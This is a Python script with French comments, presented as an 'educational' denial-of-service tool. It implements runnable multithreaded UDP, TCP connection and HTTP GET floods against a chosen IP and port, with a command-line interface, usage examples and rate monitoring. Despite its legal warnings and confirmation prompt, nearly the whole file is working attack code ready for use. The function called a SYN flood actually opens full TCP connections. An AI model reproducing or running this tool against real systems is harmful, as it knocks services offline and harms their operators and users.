"""
Educational Denial of Service (DoS) Script
This script demonstrates DoS attack concepts for EDUCATIONAL PURPOSES ONLY
WARNING: Unauthorized DoS attacks are illegal. Use only in controlled environments with permission.
"""

import socket
import threading
import time
import argparse
from datetime import datetime

# Configuration globale
ATTACK_RUNNING = False
PACKETS_SENT = 0
THREADS_ACTIVE = 0

def print_banner():
    """Affiche la bannière du programme"""
    print("=" * 60)
    print("     EDUCATIONAL DoS DEMONSTRATION TOOL")
    print("     FOR LEARNING PURPOSES ONLY")
    print("=" * 60)
    print()
    print("WARNING: This tool is for educational purposes only.")
    print("Unauthorized network attacks are illegal.")
    print("Use only on networks you own or have explicit permission to test.")
    print()
    print("=" * 60)
    print()

def print_info(message):
    """Affiche un message d'information avec timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] [INFO] {message}")

def print_warning(message):
    """Affiche un avertissement"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] [WARNING] {message}")

def print_error(message):
    """Affiche une erreur"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] [ERROR] {message}")

def validate_ip(ip):
    """Valide le format d'une adresse IP"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    """Valide un numéro de port"""
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False

# === Section 1: UDP Flood Attack ===

def udp_flood_worker(target_ip, target_port, packet_size):
    """
    Worker thread pour l'attaque UDP flood
    Envoie des paquets UDP aléatoires vers la cible
    """
    global ATTACK_RUNNING, PACKETS_SENT
    
    # Création du socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Création du payload (données aléatoires)
    payload = b'X' * packet_size
    
    while ATTACK_RUNNING:
        try:
            # Envoi du paquet UDP
            sock.sendto(payload, (target_ip, target_port))
            PACKETS_SENT += 1
        except Exception as e:
            print_error(f"UDP send failed: {e}")
            time.sleep(0.1)
    
    sock.close()

def udp_flood_attack(target_ip, target_port, num_threads, packet_size, duration):
    """
    Lance une attaque UDP flood
    """
    global ATTACK_RUNNING, PACKETS_SENT, THREADS_ACTIVE
    
    print_info(f"Starting UDP Flood Attack")
    print_info(f"Target: {target_ip}:{target_port}")
    print_info(f"Threads: {num_threads}")
    print_info(f"Packet Size: {packet_size} bytes")
    print_info(f"Duration: {duration} seconds")
    print()
    
    ATTACK_RUNNING = True
    PACKETS_SENT = 0
    threads = []
    
    # Création des threads d'attaque
    for i in range(num_threads):
        thread = threading.Thread(
            target=udp_flood_worker,
            args=(target_ip, target_port, packet_size)
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)
        THREADS_ACTIVE += 1
    
    start_time = time.time()
    
    # Monitoring de l'attaque
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            rate = PACKETS_SENT / elapsed if elapsed > 0 else 0
            print(f"\r[ATTACK] Packets sent: {PACKETS_SENT} | Rate: {rate:.2f} pkt/s | Time: {elapsed:.1f}s", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print_warning("\nAttack interrupted by user")
    
    # Arrêt de l'attaque
    ATTACK_RUNNING = False
    print("\n")
    print_info("Stopping attack threads...")
    
    for thread in threads:
        thread.join(timeout=2)
    
    print_info(f"Attack completed. Total packets sent: {PACKETS_SENT}")

# === Section 2: TCP SYN Flood Attack ===

def tcp_syn_flood_worker(target_ip, target_port):
    """
    Worker thread pour l'attaque TCP SYN flood
    Envoie des paquets TCP SYN vers la cible
    """
    global ATTACK_RUNNING, PACKETS_SENT
    
    while ATTACK_RUNNING:
        try:
            # Création d'un nouveau socket TCP pour chaque connexion
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            
            # Tentative de connexion (envoie SYN)
            sock.connect_ex((target_ip, target_port))
            PACKETS_SENT += 1
            
            # Fermeture du socket sans compléter le handshake
            sock.close()
        except Exception as e:
            pass

def tcp_syn_flood_attack(target_ip, target_port, num_threads, duration):
    """
    Lance une attaque TCP SYN flood
    """
    global ATTACK_RUNNING, PACKETS_SENT
    
    print_info(f"Starting TCP SYN Flood Attack")
    print_info(f"Target: {target_ip}:{target_port}")
    print_info(f"Threads: {num_threads}")
    print_info(f"Duration: {duration} seconds")
    print()
    
    ATTACK_RUNNING = True
    PACKETS_SENT = 0
    threads = []
    
    # Création des threads d'attaque
    for i in range(num_threads):
        thread = threading.Thread(
            target=tcp_syn_flood_worker,
            args=(target_ip, target_port)
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    
    # Monitoring de l'attaque
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            rate = PACKETS_SENT / elapsed if elapsed > 0 else 0
            print(f"\r[ATTACK] SYN packets sent: {PACKETS_SENT} | Rate: {rate:.2f} pkt/s | Time: {elapsed:.1f}s", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print_warning("\nAttack interrupted by user")
    
    # Arrêt de l'attaque
    ATTACK_RUNNING = False
    print("\n")
    print_info("Stopping attack threads...")
    
    for thread in threads:
        thread.join(timeout=2)
    
    print_info(f"Attack completed. Total SYN packets sent: {PACKETS_SENT}")

# === Section 3: HTTP Flood Attack ===

def http_flood_worker(target_ip, target_port, path):
    """
    Worker thread pour l'attaque HTTP flood
    Envoie des requêtes HTTP GET vers la cible
    """
    global ATTACK_RUNNING, PACKETS_SENT
    
    while ATTACK_RUNNING:
        try:
            # Création du socket TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            
            # Construction de la requête HTTP GET
            http_request = f"GET {path} HTTP/1.1\r\n"
            http_request += f"Host: {target_ip}\r\n"
            http_request += "User-Agent: Mozilla/5.0 (Educational DoS Tool)\r\n"
            http_request += "Connection: close\r\n\r\n"
            
            # Envoi de la requête
            sock.send(http_request.encode())
            PACKETS_SENT += 1
            
            sock.close()
        except Exception as e:
            pass

def http_flood_attack(target_ip, target_port, path, num_threads, duration):
    """
    Lance une attaque HTTP flood
    """
    global ATTACK_RUNNING, PACKETS_SENT
    
    print_info(f"Starting HTTP Flood Attack")
    print_info(f"Target: http://{target_ip}:{target_port}{path}")
    print_info(f"Threads: {num_threads}")
    print_info(f"Duration: {duration} seconds")
    print()
    
    ATTACK_RUNNING = True
    PACKETS_SENT = 0
    threads = []
    
    # Création des threads d'attaque
    for i in range(num_threads):
        thread = threading.Thread(
            target=http_flood_worker,
            args=(target_ip, target_port, path)
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    
    # Monitoring de l'attaque
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            rate = PACKETS_SENT / elapsed if elapsed > 0 else 0
            print(f"\r[ATTACK] HTTP requests sent: {PACKETS_SENT} | Rate: {rate:.2f} req/s | Time: {elapsed:.1f}s", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print_warning("\nAttack interrupted by user")
    
    # Arrêt de l'attaque
    ATTACK_RUNNING = False
    print("\n")
    print_info("Stopping attack threads...")
    
    for thread in threads:
        thread.join(timeout=2)
    
    print_info(f"Attack completed. Total HTTP requests sent: {PACKETS_SENT}")

# === Section Main ===

def main():
    """
    Fonction principale du programme
    """
    print_banner()
    
    # Configuration du parser d'arguments
    parser = argparse.ArgumentParser(
        description="Educational DoS Demonstration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  UDP Flood:    python script.py --type udp --target 192.168.1.100 --port 80 --threads 10 --duration 30
  TCP SYN Flood: python script.py --type tcp --target 192.168.1.100 --port 80 --threads 50 --duration 30
  HTTP Flood:    python script.py --type http --target 192.168.1.100 --port 80 --threads 20 --duration 30

Remember: Use only on networks you own or have explicit permission to test!
        """
    )
    
    parser.add_argument("--type", required=True, choices=["udp", "tcp", "http"],
                        help="Type of DoS attack (udp, tcp, http)")
    parser.add_argument("--target", required=True,
                        help="Target IP address")
    parser.add_argument("--port", type=int, required=True,
                        help="Target port number")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of threads (default: 10)")
    parser.add_argument("--duration", type=int, default=30,
                        help="Attack duration in seconds (default: 30)")
    parser.add_argument("--packet-size", type=int, default=1024,
                        help="Packet size for UDP flood in bytes (default: 1024)")
    parser.add_argument("--path", default="/",
                        help="HTTP path for HTTP flood (default: /)")
    
    args = parser.parse_args()
    
    # Validation des paramètres
    if not validate_ip(args.target):
        print_error("Invalid IP address format")
        return
    
    if not validate_port(args.port):
        print_error("Invalid port number (must be 1-65535)")
        return
    
    if args.threads < 1 or args.threads > 1000:
        print_error("Number of threads must be between 1 and 1000")
        return
    
    if args.duration < 1:
        print_error("Duration must be at least 1 second")
        return
    
    # Confirmation de l'utilisateur
    print_warning("You are about to launch a DoS attack simulation")
    print_warning(f"Target: {args.target}:{args.port}")
    print_warning("This should ONLY be done on systems you own or have permission to test")
    confirmation = input("\nType 'YES' to confirm and proceed: ")
    
    if confirmation != "YES":
        print_info("Operation cancelled by user")
        return
    
    print()
    
    # Lancement de l'attaque appropriée
    try:
        if args.type == "udp":
            udp_flood_attack(args.target, args.port, args.threads, args.packet_size, args.duration)
        elif args.type == "tcp":
            tcp_syn_flood_attack(args.target, args.port, args.threads, args.duration)
        elif args.type == "http":
            http_flood_attack(args.target, args.port, args.path, args.threads, args.duration)
    except Exception as e:
        print_error(f"Attack failed: {e}")
    
    print()
    print_info("Program terminated")

if __name__ == "__main__":
    main()
